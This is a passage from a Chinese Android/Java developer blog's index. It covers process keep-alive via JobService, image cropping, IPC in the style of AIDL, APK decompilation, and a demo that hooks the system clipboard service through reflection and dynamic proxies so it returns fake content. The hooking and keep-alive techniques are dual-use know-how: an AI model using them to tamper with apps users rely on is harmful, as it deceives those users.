设置执行延迟 builder.setOverrideDeadline(0); // 设置持续运行 builder.setPersisted(true); JobScheduler jobScheduler = (JobScheduler) this.getSystemService(Context.JOB_SCHEDULER_SERVICE); jobScheduler.schedule(builder.build()); &#125; @Override public boolean onStartJob(JobParameters params) &#123; Log.d(TAG, \"onStartJob\"); return false; &#125; @Override public boolean onStopJob(JobParameters params) &#123; return false; &#125;&#125; 使用JobService和把Service设置为Persisted都需要我们在Manifest中配置相应的参数： 然后运行服务即可发现，在Service所在进程被杀掉后，我们的Service会自动重启：首次运行： 使用kill指令杀掉后： 该方法依然有它的缺陷：首先，JobService只适用于Android5.0以上的系统；其次，当进程被force-stop指令杀死后，JobService依旧无法拉活进程。 利用账号同步机制进行拉活除了上述拉活方法以外，我们还可以在Android定期同步账号时进行拉活操作。由于博主在这方面研究不深，故不作深入描述。这种方法所存在的缺陷是：需要进行账号授权和同步服务。 最后以一张思维导图来总结上述Android 进程保活的内容：","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"},{"name":"内存","slug":"内存","permalink":"https://superxlcr.github.io/tags/内存/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"},{"name":"linux","slug":"linux","permalink":"https://superxlcr.github.io/tags/linux/"}]},{"title":"关于Android实现裁剪功能总结","slug":"关于Android实现裁剪功能总结","date":"2017-04-17T09:42:07.000Z","updated":"2020-05-11T07:23:44.816Z","comments":true,"path":"2017/04/17/关于Android实现裁剪功能总结/","link":"","permalink":"https://superxlcr.github.io/2017/04/17/关于Android实现裁剪功能总结/","excerpt":"","text":"最近在进行毕业设计的时候，需要实现一个图片裁剪的功能。在此，对Android系统如何实现图片裁剪功能进行一个小结。 使用com.android.camera.action.cropcom.android.camera.action.crop是Android系统提供的一个Intent，我们可以利用该Intent打开一个裁剪用的Activity，然后通过onActivityResult返回或者把图片保存到外部的方式获取裁剪的结果。 com.android.camera.action.crop所使用的参数如下表所示： 附加选项 数据类型 描述 crop String 发送裁剪信号，“true”表示启用裁剪 aspectX int X方向比例 aspectY int Y方向比例 outputX int 裁剪区的宽 outputY int 裁剪区的高 scale boolean 是否保留比例 return-data boolean 是否将裁剪数据保留在Bitmap中返回 data Parcelable 需要裁剪的Bitmap数据 circleCrop boolean 是否圆形裁剪区域 MediaStore.EXTRA_OUTPUT URI 裁剪数据输出位置 下面为一段裁剪图片的例子： 1234567891011121314private void cropPhoto(Uri uri) &#123; Intent intent = new Intent(\"com.android.camera.action.CROP\"); intent.setDataAndType(uri, \"image/*\"); intent.putExtra(\"scale\", true); // 裁剪比例 intent.putExtra(\"aspectX\", xxx); intent.putExtra(\"aspectY\", xxx); // 裁剪宽高 intent.putExtra(\"outputX\", xxx); intent.putExtra(\"outputY\", xxx); // 文件输出位置 intent.putExtra(MediaStore.EXTRA_OUTPUT, imageUri); startActivityForResult(intent, CROP_PHOTO);&#125; 123456Intent photoPickerIntent = new Intent(Intent.ACTION_PICK, android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI);photoPickerIntent.setType(\"image/*\");photoPickerIntent.putExtra(\"crop\", \"true\");photoPickerIntent.putExtra(MediaStore.EXTRA_OUTPUT, xxx);photoPickerIntent.putExtra(\"outputFormat\", Bitmap.CompressFormat.JPEG.toString());startActivityForResult(photoPickerIntent, REQ_CODE_PICK_IMAGE); 在例子中我们设置了MediaStore.EXTRA_OUTPUT参数，因此裁剪的结果将会保存在我们参数的URI中。 com.android.camera.action.crop的缺点虽然com.android.camera.action.crop这个API看起来很方便，然而它还是有非常明显的缺点的。首先，它不是一个官方公开的API接口，在Android官方网站上我们找不到和该接口有关的资料，同时Google可以在不发表任何通知的情况下更改或取消该接口。虽然它一般情况下在大部分的设备上都可以使用，但并不能保证100%不会出现问题或导致APP crash。其次，在使用“return-data”参数获取返回值时，获得的图片在大小尺寸上会有较大的问题。当我们裁剪图片的尺寸大小在300像素以上时，APP有极大可能会crash，更甚者会死机直到你拆掉手机电池重新安上才解决。因此，当我们使用这个接口时，应尽量避免通过onActivityResult返回裁剪结果。 其他的图片裁剪办法由于com.android.camera.action.crop这个API并非官方的正式API，再加上在通过onActivityResult获取的图片尺寸有一定的问题，因此我们需要使用一些别的方法来实现图片裁剪功能。在此，我们可以使用一些第三方库来实现图片裁剪的功能。第三方图片裁剪库github：https://github.com/lvillani/android-cropimage使用例子如下： 12345678910private void doCrop(File croppedResult)&#123; CropImageIntentBuilder builder = new CropImageIntentBuilder(600,600, croppedResult); // don't forget this, the error handling within the library is just ignoring if you do builder.setSourceImage(mImageCaptureUri); Intent intent = builder.getIntent(getApplicationContext()); // do not use return data for big images intent.putExtra(\"return-data\", false); // start an activity and then get the result back in onActivtyResult startActivityForResult(intent, CROP_FROM_CAMERA); &#125; 对于图片裁剪问题更详细的讨论请查看StackOverflow：http://stackoverflow.com/questions/12758425/how-to-set-the-output-image-use-com-android-camera-action-crop","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"}]},{"title":"BufferedReader使用readLine问题","slug":"BufferedReader使用readLine问题","date":"2017-03-16T12:53:09.000Z","updated":"2020-05-11T07:23:44.660Z","comments":true,"path":"2017/03/16/BufferedReader使用readLine问题/","link":"","permalink":"https://superxlcr.github.io/2017/03/16/BufferedReader使用readLine问题/","excerpt":"","text":"有时我们在使用BufferedReader时候会发现使用readLine函数迟迟没有任何返回，这是因为BufferedReader和BufferedWriter是基于行进行操作的，因此我们使用BufferedWriter的时候使用newLine函数即可，具体代码如下： 1234567BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(out));writer.write(str);writer.newLine();writer.flush();BufferedReader reader = new BufferedReader(new InputStreamReader(in));str = reader.readLine();","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"Java读取文件byte转化String问题","slug":"Java读取文件byte转化String问题","date":"2017-03-16T12:25:46.000Z","updated":"2020-05-11T07:23:44.705Z","comments":true,"path":"2017/03/16/Java读取文件byte转化String问题/","link":"","permalink":"https://superxlcr.github.io/2017/03/16/Java读取文件byte转化String问题/","excerpt":"","text":"最近接触了关于读取文件获得byte数组转化为String后的问题，具体代码如下： 12345678910111213141516171819// 打开图片作为临时文件File tempFile = new File(\"C:/Users/Administrator/Desktop/test.jpg\");try &#123; FileInputStream fis = new FileInputStream(tempFile); byte[] bytes = new byte[1024]; // 读取文件byte数组 fis.read(bytes); System.out.println(\"bytes.length \" + bytes.length); // 直接转化为String String bytesStr = new String(bytes); System.out.println(\"bytesStr.length() \" + bytesStr.length()); System.out.println(\"bytesStr.getBytes().length \" + bytesStr.getBytes().length); // 使用ISO-8859-1编码转化为String String bytesStr2 = new String(bytes, \"ISO-8859-1\"); System.out.println(\"bytesStr2.length() \" + bytesStr2.length()); System.out.println(\"bytesStr2.getBytes(\\\"ISO-8859-1\\\").length \" + bytesStr2.getBytes(\"ISO-8859-1\").length);&#125; catch (IOException e) &#123; e.printStackTrace();&#125; 运行出来效果如下： 可以发现在使用ISO-8859-1编码后，byte和String的转化问题得到了解决，长度达到了一致。","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"关于Android Log类使用的一些反思","slug":"关于Android-Log类使用的一些反思","date":"2017-02-27T14:30:11.000Z","updated":"2020-05-11T07:23:44.815Z","comments":true,"path":"2017/02/27/关于Android-Log类使用的一些反思/","link":"","permalink":"https://superxlcr.github.io/2017/02/27/关于Android-Log类使用的一些反思/","excerpt":"","text":"最近在使用Android的日志Log类的时候遇到了两个问题，特此写下一篇总结记录： 日志无法正常输出问题经测试发现System.out.print 可以正常打印消息，但是使用Log类却无法打印日志。 解决办法：手机开发者选项中禁用了日志打印的功能，开启即可。 下图为魅族4开启开发者选项中的高级日志输出： Coolpad 8720L 手机： 机器在出厂时将log的级别做了限制，方法是：拨号盘输入*20121220# -&gt; 选择日志输出级别 -&gt; 选择Java log level -&gt; 选择LOGD即可。 Log打印异常错误问题在Java中我们经常习惯使用e.printStackTrace 来输出异常，但是在Android中我们应该使用Android提供的Log工具打印日志： 1Log.e(TAG, Log.getStackTraceString(e)); 详见：http://stackoverflow.com/questions/3855187/is-it-a-bad-idea-to-use-printstacktrace-in-android-exceptions","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"}]},{"title":"getWidth与getMeasuredWidth区别","slug":"getWidth与getMeasuredWidth区别","date":"2016-10-07T07:55:49.000Z","updated":"2020-05-11T07:23:44.770Z","comments":true,"path":"2016/10/07/getWidth与getMeasuredWidth区别/","link":"","permalink":"https://superxlcr.github.io/2016/10/07/getWidth与getMeasuredWidth区别/","excerpt":"","text":"最近遇到了关于View类中，getWidth方法与getMeasuredWidth方法的区别，在此写一遍博客总结一下。众所周知View的绘制流程分为Measure、Layout和Draw三个阶段，想了解详细情况的可以参考我的这篇博客： 一个Activity的显示过程总结（四） getMeasuredWidth返回的是：Measure阶段测量的结果其代码如下： 12345678910/** * Like &#123;@link #getMeasuredWidthAndState()&#125;, but only returns the * raw width component (that is the result is masked by * &#123;@link #MEASURED_SIZE_MASK&#125;). * * @return The raw measured width of this view. */ public final int getMeasuredWidth() &#123; return mMeasuredWidth &amp; MEASURED_SIZE_MASK; &#125; 而getView返回的是：Layout阶段测量的结果，一般也是View实际绘制的大小其代码如下： 123456789/** * Return the width of the your view. * * @return The width of your view, in pixels. */@ViewDebug.ExportedProperty(category = \"layout\")public final int getWidth() &#123; return mRight - mLeft;&#125; 通常情况下，两个方法返回的值应该是相等的。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"view","slug":"view","permalink":"https://superxlcr.github.io/tags/view/"}]},{"title":"ClipboardManager Hook总结","slug":"ClipboardManager-Hook总结","date":"2016-09-23T03:47:34.000Z","updated":"2020-05-11T07:23:44.661Z","comments":true,"path":"2016/09/23/ClipboardManager-Hook总结/","link":"","permalink":"https://superxlcr.github.io/2016/09/23/ClipboardManager-Hook总结/","excerpt":"","text":"最近学习了如何Hook Android中的剪贴板服务，特此写下一篇博客记录。首先说明下什么是Hook，Hook即通过使用代理对象替换系统原有对象，达到增强或修改系统类的功能的手段。一般我们替换的对象都会选择不易改变的静态对象。下面首先介绍Android中获取系统服务的步骤，然后再介绍如何Hook 剪贴板服务ClipboardManager。以下代码版本为Android 4.4首先我们调用Context的getSystemService方法，由于Context的实际功能实现类为 ContextImpl，故我们追踪ContextImpl的代码： 12345@Overridepublic Object getSystemService(String name) &#123; ServiceFetcher fetcher = SYSTEM_SERVICE_MAP.get(name); return fetcher == null ? null : fetcher.getService(this);&#125; ContextImpl去检查了一个系统服务的缓存HashMap SYSTEM_SERVICE_MAP，如下所示（以下仅截取关键代码）： 12345678910111213141516171819202122232425private static final HashMap&lt;String, ServiceFetcher&gt; SYSTEM_SERVICE_MAP = new HashMap&lt;String, ServiceFetcher&gt;();private static void registerService(String serviceName, ServiceFetcher fetcher) &#123; if (!(fetcher instanceof StaticServiceFetcher)) &#123; fetcher.mContextCacheIndex = sNextPerContextServiceCacheIndex++; &#125; SYSTEM_SERVICE_MAP.put(serviceName, fetcher);&#125;static &#123; registerService(ALARM_SERVICE, new ServiceFetcher() &#123; public Object createService(ContextImpl ctx) &#123; IBinder b = ServiceManager.getService(ALARM_SERVICE); IAlarmManager service = IAlarmManager.Stub.asInterface(b); return new AlarmManager(service, ctx); &#125;&#125;); registerService(CLIPBOARD_SERVICE, new ServiceFetcher() &#123; public Object createService(ContextImpl ctx) &#123; return new ClipboardManager(ctx.getOuterContext(), ctx.mMainThread.getHandler()); &#125;&#125;);&#125; ServiceFetcher是ContextImpl的一个内部类，当我们初次调用getService方法时，会调用createService返回结果SYSTEM_SERVICE_MAP通过静态代码块初始化注册完毕，其中主要的createService返回方式有两种： 返回xxxManager（我们这次实验的剪贴板就是这种形式），其中一般在内部会有接口的缓存，初次获取缓存的方式与下一种方法相同 调用ServiceManager的getService方法返回一个通信用的IBinder，通过IInterface（即IxxxManager）的内部类Stub的asInterface方法转换为可用的接口（可能是实体也是能是代理） ClipboardManager的关键代码如下： 1234567891011121314public class ClipboardManager extends android.text.ClipboardManager &#123; private static IClipboard sService; static private IClipboard getService() &#123; synchronized (sStaticLock) &#123; if (sService != null) &#123; return sService; &#125; IBinder b = ServiceManager.getService(\"clipboard\"); sService = IClipboard.Stub.asInterface(b); return sService; &#125; &#125;&#125; ClipboardManager实际服务的提供都会使用getService来调用。 先来看看ServiceManager的getService方法： 123456789101112131415161718192021public final class ServiceManager &#123; private static final String TAG = \"ServiceManager\"; private static IServiceManager sServiceManager; private static HashMap&lt;String, IBinder&gt; sCache = new HashMap&lt;String, IBinder&gt;(); public static IBinder getService(String name) &#123; try &#123; IBinder service = sCache.get(name); if (service != null) &#123; return service; &#125; else &#123; return getIServiceManager().getService(name); &#125; &#125; catch (RemoteException e) &#123; Log.e(TAG, \"error in getService\", e); &#125; return null; &#125;&#125; 该方法首先回去检查sCache的缓存service，如果没有则会调用IServiceManager去获取真正的Service服务。 接下来asInterface的关键代码如下（IClipboard.Stub类，实际就是AIDL自动生成的类文件）： 12345678910111213141516171819202122232425/** Local-side IPC implementation stub class. */public static abstract class Stub extends android.os.Binder implements android.content.IClipboard &#123; private static final java.lang.String DESCRIPTOR = \"android.content.IClipboard\"; /** Construct the stub at attach it to the interface. */ public Stub() &#123; this.attachInterface(this, DESCRIPTOR); &#125; /** * Cast an IBinder object into an android.content.IClipboard interface, * generating a proxy if needed. */ public static android.content.IClipboard asInterface(android.os.IBinder obj) &#123; if ((obj==null)) &#123; return null; &#125; android.os.IInterface iin = obj.queryLocalInterface(DESCRIPTOR); if (((iin!=null)&amp;&amp;(iin instanceof android.content.IClipboard))) &#123; return ((android.content.IClipboard)iin); &#125; return new android.content.IClipboard.Stub.Proxy(obj); &#125;&#125; 在asInterface方法中，首先调用了IBinder对象的queryLocalInterface方法来查找是否本地含有此接口（如果是同一进程就含有），如果不是则返回代理对象。 总的来说，Android获取系统服务步骤如下图所示： 其中我们可以进行Hook的点，主要是红色的两个部分： Hook xxxManager中的sService服务缓存 利用sCache缓存表Hook SystemService中getService返回的IBinder对象 方法一的代码如下： 1234567891011121314151617181920212223242526/** * hook 方法1 * * @throws Exception */public static void hook1() throws Exception &#123; // 加载ClipboardManager类 Class&lt;?&gt; clipboardManagerClazz = Class .forName(\"android.content.ClipboardManager\"); // 通过getService static方法获取真实IClipboard对象 Method getServiceMethod = clipboardManagerClazz .getDeclaredMethod(\"getService\"); getServiceMethod.setAccessible(true); // 真实IClipboard对象 Object clipboardManager = getServiceMethod.invoke(null); // 获取sService的IClipboard缓存 Field sServiceFeild = clipboardManagerClazz .getDeclaredField(\"sService\"); sServiceFeild.setAccessible(true); // 替换sService sServiceFeild.set(null, Proxy .newProxyInstance(clipboardManager.getClass().getClassLoader(), clipboardManager.getClass().getInterfaces(), new ClipboardManagerProxyHandler( clipboardManager)));&#125; Java动态代理的InvocationHandler接口如下： 123456789101112131415161718192021222324252627/** * Created by superxlcr on 2016/9/20. * 剪贴板代理处理类 */public class ClipboardManagerProxyHandler implements InvocationHandler &#123; // 真正的clipboardManager private Object clipboardManager; public ClipboardManagerProxyHandler(Object clipboardManager) &#123; this.clipboardManager = clipboardManager; &#125; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; switch (method.getName()) &#123; case \"getPrimaryClip\": // 粘贴内容 return ClipData.newPlainText(null, \"you are hook!\"); case \"hasPrimaryClip\": // 剪贴板永远有粘贴内容 return true; &#125; // 其余情况由真实对象处理 return method.invoke(clipboardManager, args); &#125;&#125; 在这里我们替换掉了，判断剪贴板是否有内容的hasPrimaryClip方法与返回剪贴内容的getPrimaryClip方法，使剪贴板粘贴总是返回you are hook 方法二代码如下所示： 12345678910111213141516171819202122232425262728/** * hook方法2 * * @throws Exception */public static void hook2() throws Exception &#123; // 加载ServiceManager类 Class&lt;?&gt; serviceManagerClazz = Class .forName(\"android.os.ServiceManager\"); // 获取getService方法 Method getServiceMethod = serviceManagerClazz .getMethod(\"getService\", String.class); // 获取真正的clipboardManager对象 IBinder clipboardManagerIBinder = (IBinder) getServiceMethod .invoke(null, CLIPBOARD); // 获取sCache HashMap缓存 Field sCacheField = serviceManagerClazz.getDeclaredField(\"sCache\"); // private变量 sCacheField.setAccessible(true); // static变量 HashMap&lt;String, IBinder&gt; sCache = (HashMap) sCacheField.get(null); // 把代理放入缓存 sCache.put(CLIPBOARD, (IBinder) Proxy.newProxyInstance( clipboardManagerIBinder.getClass().getClassLoader(), clipboardManagerIBinder.getClass().getInterfaces(), new ClipboardManagerIBinderProxyHandler( clipboardManagerIBinder)));&#125; 其中对IBinder的动态代理如下： 1234567891011121314151617181920212223242526272829303132333435/** * Created by superxlcr on 2016/9/21. * 剪贴板通信代理处理类 */public class ClipboardManagerIBinderProxyHandler implements InvocationHandler &#123; // 真正的clipboardManagerIBinder private IBinder clipboardManagerIBinder; public ClipboardManagerIBinderProxyHandler( IBinder clipboardManagerIBinder) &#123; this.clipboardManagerIBinder = clipboardManagerIBinder; &#125; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; if (method.getName().equals(\"queryLocalInterface\")) &#123; // 返回伪造代理对象 // 加载IClipboard内部类Stub Class&lt;?&gt; IClipboardStubClazz = Class .forName(\"android.content.IClipboard$Stub\"); // 获取asInterface方法 Method asInterfaceMethod = IClipboardStubClazz .getMethod(\"asInterface\", IBinder.class); // 通过asInterface static方法，得到真正IClipboard对象 Object clipboardManager = asInterfaceMethod .invoke(null, clipboardManagerIBinder); return Proxy.newProxyInstance( clipboardManager.getClass().getClassLoader(), clipboardManager.getClass().getInterfaces(), new ClipboardManagerProxyHandler(clipboardManager)); &#125; return method.invoke(clipboardManagerIBinder, args); &#125;&#125; 这里我们修改了queryLocalInterface方法，使其返回我们代理的IClipboard接口对象，其余部分与方法一相同。 最后附上该工程的地址，有兴趣的同学可以下载看看：https://github.com/superxlcr/ClipboardManagerHook","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"}]},{"title":"网络安全学习总结","slug":"网络安全学习总结","date":"2016-09-20T07:19:32.000Z","updated":"2020-05-11T07:23:44.901Z","comments":true,"path":"2016/09/20/网络安全学习总结/","link":"","permalink":"https://superxlcr.github.io/2016/09/20/网络安全学习总结/","excerpt":"","text":"以下是本人学习网络安全总结的一些内容：总知识架构图： 加密模式：ECB（电子密码本）： CBC（密码分组链接）： CFB（密码反馈）： OFB（输出反馈）： CTR（计数器）：","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/categories/计算机网络/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/tags/计算机网络/"},{"name":"思维导图","slug":"思维导图","permalink":"https://superxlcr.github.io/tags/思维导图/"},{"name":"大纲","slug":"大纲","permalink":"https://superxlcr.github.io/tags/大纲/"}]},{"title":"Android仿AIDL进程间通信","slug":"Android仿AIDL进程间通信","date":"2016-09-14T07:09:17.000Z","updated":"2020-05-11T07:23:44.563Z","comments":true,"path":"2016/09/14/Android仿AIDL进程间通信/","link":"","permalink":"https://superxlcr.github.io/2016/09/14/Android仿AIDL进程间通信/","excerpt":"","text":"最近了解了一些关于AIDL（Android Interface Definition Language）的知识，在此通过模仿AIDL进程间通信的原理加深印象。首先我们定义两个进程通信使用的接口： 1234567891011public interface MyRemoteInterface extends IInterface &#123; // 接口描述符 static final String DESCRIPTOR = \"MyRemoteInterface\"; // 方法描述符 static final int TRANSACTION_myFunction = (IBinder.FIRST_CALL_TRANSACTION + 0); String myFunction(String s); &#125; 这个接口继承自IInterface（IInterface是Binder中接口的基类，所有Binder的接口都要继承它），里面定义了一个我们的方法myFunction，并含有两个静态常量用于表示该接口与该方法。Binder的进程间通信模型是C/S模式，接下来我们在Server进程实现该接口： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class MyIRemoteService extends Binder implements MyRemoteInterface &#123; private static final String TAG = \"MyIRemoteService\"; MyIRemoteService() &#123; // 绑定IInterface接口 attachInterface(this, DESCRIPTOR); &#125; @Override public IBinder asBinder() &#123; return this; &#125; @Override protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException &#123; switch (code) &#123; case INTERFACE_TRANSACTION: Log.d(TAG, \"INTERFACE_TRANSACTION\"); reply.writeString(DESCRIPTOR); return true; case TRANSACTION_myFunction: Log.d(TAG, \"TRANSACTION_myFunction\"); data.enforceInterface(DESCRIPTOR); String s; s = data.readString(); String result = this.myFunction(s); reply.writeNoException(); reply.writeString(result); return true; &#125; return super.onTransact(code, data, reply, flags); &#125; /** * 自己定义的方法，log打印字符串并返回 * * @param s * @return */ public String myFunction(String s) &#123; Log.d(TAG, s); return \"A message from \" + TAG + \" : \" + s; &#125;&#125; 由于MyIRemoteService是Server进程中的通信对象，因此它是一个实体的对象。我们在其构造函数中进行了接口注册，实现了 MyRemoteInterface 中的 asBinder 与 myFunction 两个方法。我们重写了onTransact方法，当Client进程中的代理对象通过transact方法传输数据时，我们判断是否需要执行我们的myFunction方法并返回结果。我们在Service的onBind方法返回我们的MyIRemoteService对象： 1234567891011121314151617public class MyRemoteService extends Service &#123; private final String TAG = \"MyService\"; @Override public IBinder onBind(Intent intent) &#123; // 返回MyIRemoteService对象 return new MyIRemoteService(); &#125; @Override public void onCreate() &#123; super.onCreate(); Log.v(TAG, \"onCreate\"); &#125;&#125; Service的注册xml如下： 123456&lt;service android:name=\"com.example.test.MyRemoteService\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"com.example.test.myAidl\"/&gt; &lt;/intent-filter&gt; &lt;/service&gt; 接下来我们来实现Client进程的通信对象： 12345678910111213141516171819202122232425262728293031323334353637383940public class MyIRemoteServiceProxy implements MyRemoteInterface &#123; // 代理对象 private IBinder mRemote; public MyIRemoteServiceProxy(IBinder mRemote) &#123; this.mRemote = mRemote; &#125; @Override public IBinder asBinder() &#123; return mRemote; &#125; /** * 自己定义的方法，log打印字符串并返回 * * @param s * @return */ public String myFunction(String s) &#123; Parcel data = Parcel.obtain(); Parcel reply = Parcel.obtain(); String result = \"\"; try &#123; data.writeInterfaceToken(DESCRIPTOR); data.writeString(s); mRemote.transact(TRANSACTION_myFunction, data, reply, 0); reply.readException(); result = reply.readString(); &#125; catch (RemoteException e) &#123; e.printStackTrace(); &#125; finally &#123; reply.recycle(); data.recycle(); &#125; return result; &#125; &#125; 由于MyIRemoteServiceProxy是存在于Client进程中的通信对象，因此一般而言它并不是一个实体对象，而是一个代理对象。我们在其构造函数中保存了具有通信能力的IBinder对象，在调用myFunction时，通过transact方法识别要调用的接口与具体方法，并获取Server进程onTransact方法返回的结果。在Client进程的Activity中，调用过程如下： 123456789101112131415161718192021222324252627282930public class MyActivity extends Activity &#123; private final String TAG = \"MyActivity\"; private ServiceConnection connection = new ServiceConnection() &#123; @Override public void onServiceDisconnected(ComponentName name) &#123; &#125; @Override public void onServiceConnected(ComponentName name, IBinder service) &#123; MyIRemoteServiceProxy mRemoteService = new MyIRemoteServiceProxy(service); Log.v(TAG, mRemoteService.myFunction(\"Activity Message!\")); &#125; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Log.v(TAG, \"onCreate\"); // 绑定远程Service Intent intent = new Intent(); intent.setAction(\"com.example.test.myAidl\"); bindService(intent, connection, Context.BIND_AUTO_CREATE); &#125;&#125; 此处我们直接给Server进程发送了一条字符串并打印，效果如下：上图中Client进程pid为883，tid为883Server进程pid为830，主线程tid为830，处理Binder通信子线程tid为841","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"通信","slug":"通信","permalink":"https://superxlcr.github.io/tags/通信/"}]},{"title":"Apk反编译","slug":"Apk反编译","date":"2016-09-08T04:29:55.000Z","updated":"2020-05-11T07:23:44.656Z","comments":true,"path":"2016/09/08/Apk反编译/","link":"","permalink":"https://superxlcr.github.io/2016/09/08/Apk反编译/","excerpt":"","text":"作为一名Android开发人员，由于debug或者是某些别的需要，我们经常要去反编译一些apk，在这里讲述一下如何反编译一个apk文件。首先我们需要下载三个反编译工具： apktool（用于反编译apk资源文件） dex2jar（用于把dex文件转为jar文件） jd-gui（jar反编译工具） 这里以一个decompile.apk的反编译过程为例： 这里有一个名为decompile的apk，我们想看看里面究竟有什么东西首先我们需要下载apktool.jar。值得注意的是，要使用jar，我们的Java环境需要事先配置好使用java -jar apktool.jar使用apktool工具，使用命令d表示反编译，-f 参数为反编译的apk文件，-o 参数为文件输出地址： 然后在decompile文件夹中可以看到，所有的资源文件一目了然： 接下来我们来反编译apk的代码：把apk文件后缀改为zip： 利用解压工具解压apk，从解压出的文件中找到class.dex： 利用dex2jar把它转化为jar文件： 然后在使用jd-gui打开得到的jar文件： 大功告成！这里博主反编译的apk只是随便生成的，并没有经过代码混淆，可读性还是非常强的。然而一般发布的apk都会有代码混淆的流程，变量都会被一些毫无意义的字符代替，反编译出来后能看懂多少就看各位的造化了~ 值得注意的是直接解压出来的xml文件会是一团乱码，大伙也可以不使用apktool反编译，而是使用AXMLprinter2.jar来反编译xml文件：直接解压后： 使用AXMLprinter2.jar： 1java -jar AXMLPrinter2.jar AndroidManifest.xml &gt; AndroidManifest.txt 得到的txt文件： 补充一下，我们也可以直接使用github上的jadx开源工具，直接反编译整个apk：https://github.com/skylot/jadx","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"编译","slug":"编译","permalink":"https://superxlcr.github.io/tags/编译/"}]},{"title":"Gradle介绍","slug":"Gradle介绍","date":"2016-08-14T07:25:11.000Z","updated":"2020-05-11T07:23:44.663Z","comments":true,"path":"2016/08/14/Gradle介绍/","link":"","permalink":"https://superxlcr.github.io/2016/08/14/Gradle介绍/","excerpt":"","text":"Gradle是一个用于构建Android工程的工具，同时它也是一个编程框架。Gradle用于帮助我们自动管理编译流程，它允许我们定义个性化的编译内容，每个工程拥有自己的源码和资源的同时，还能使用一些通用的配置。而且Gradle和Android Studio是分离的，我们可以在不启动Android Studio的同时，单独使用命令行完成工程的编译工作。Gradle语言具有以下特点： 基于Groovy语言 是一种DSL，即Domain Specific Language，领域相关语言，有自己特有的术语 因此对于Gradle的介绍，本文大致分为以下三个部分： Groovy 语言简单介绍 Gradle 介绍 Android Studio 中常见的 Gradle 问题 Groovy 语言简单介绍概况Groovy是在 Java平台上的、 具有像Python， Ruby 和 Smalltalk 语言特性的灵活动态语言， Groovy保证了这些特性像 Java语法一样被 Java开发者使用。我们编写的Java代码可直接当成Groovy Code来执行。Java、Groovy和JVM的关系如下图所示：Groovy Code 与 Java Code一致在执行的时候变成Java字节码在JVM上执行 Groovy下载地址：http://www.groovy-lang.org/download.html Groovy文档地址：http://www.groovy-lang.org/documentation.html Groovy的执行效果大致如下所示： Groovy 语法特点介绍Groovy在语法上与Java类似，但它有如下特点： Groovy语句可以不用分号结尾 Groovy中支持动态类型，即定义变量的时候可以不指定其类型。Groovy中，变量定义可以使用关键字def，也可以不使用（但推荐都加上def，不然有时会报找不到属性值的错误） 函数定义时，参数的类型也可以不指定（不指定意思即参数为动态类型） Groovy中函数的返回值也可以是动态类型的 Groovy的函数里，可以不使用return来为函数设置返回值。如果不使用return语句的话，则函数里最后一句代码的执行结果会默认被设置成返回值 函数调用可以不带括号（不过不带括号有可能会使函数被误认为是变量，因此一般是在Groovy API或 Gradle API上比较常用的函数才不带括号） 例如：println ‘hello groovy’，一个调用println函数的例子 Groovy 字符串介绍Groovy对字符串支持相当强大，充分吸收了一些脚本语言的优点： 单引号’’中的内容严格对应Java中的String，就是普通的字符串 双引号””的内容则和脚本语言的处理有点像，如果字符中有$符号的话，则它会先求$变量的值 12def x = 10println &quot;x is $x&quot; // x is 10 三个引号’’’xxx’’’中的字符串支持随意换行 Groovy 数据类型介绍在这里我们主要介绍Groovy的三种数据类型：（详情请自行查阅文档） Java中的基本数据类型（在实际执行过程中会被转换为对应的包装类型） Groovy中的容器类，容器类型有以下三种：List，Map，Range（和List类似） 闭包 值得注意的是在Groovy中获取对象的某个属性直接访问即可（如：a.b），执行时访问过程会转换为对应的getter和setter方法（因此有时候查看文档没有相关属性时，不妨去看看getter和setter方法） 在此特别介绍下Groovy关键的闭包类型。闭包，是一种数据类型，它代表了一段可执行的代码。定义一个闭包的方式有三种，如下： 123def closure = &#123; paramters -&gt; code &#125; // 箭头前面为参数，后面为执行代码def closure = &#123; code &#125; // 有一个默认无类型参数 itdef closure = 